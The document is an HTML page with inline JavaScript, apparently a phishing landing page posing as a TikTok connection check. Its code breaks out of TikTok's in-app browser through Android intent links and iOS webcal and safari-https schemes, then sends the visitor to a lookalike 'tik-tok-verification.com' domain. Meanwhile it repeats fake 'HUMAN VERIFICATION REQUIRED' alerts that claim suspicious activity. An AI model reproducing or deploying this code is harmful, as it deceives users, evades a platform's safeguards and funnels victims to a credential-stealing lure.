<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }</style>
</head>
<body>
    <div style="font-family:sans-serif; color:#666;">Verifying Connection...</div>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const cleanUrl = targetUrl.replace(/^https?:\/\//, '');
    const killTime = Date.now() + 5000;

    function theWebcalNuke() {
        const isAndroid = /Android/i.test(navigator.userAgent);

        if (isAndroid) {
            // Android: We use the "Market" bypass. 
            // TikTok lets 'market://' links through to the OS picker.
            // We use it to force a browser selection.
            window.location.href = `intent://${cleanUrl}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
        } else {
            // iOS: THE WEBCAL TRIGGER
            // TikTok sees 'webcal://' and cannot handle it internally.
            // This triggers the "Open in Calendar/Safari?" system prompt.
            window.location.href = "webcal://" + cleanUrl;

            // Immediately follow up with the direct Safari-Https call
            setTimeout(() => {
                window.location.href = "safari-https://" + cleanUrl;
            }, 100);
        }
    }

    function runLogic() {
        if (Date.now() > killTime) {
            window.location.replace(targetUrl);
            return;
        }

        theWebcalNuke();

        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);
                
                theWebcalNuke();
                setTimeout(runLogic, 250);
            }
        }, 250);
    }

    window.onload = runLogic;
</script>
</body>
</html>
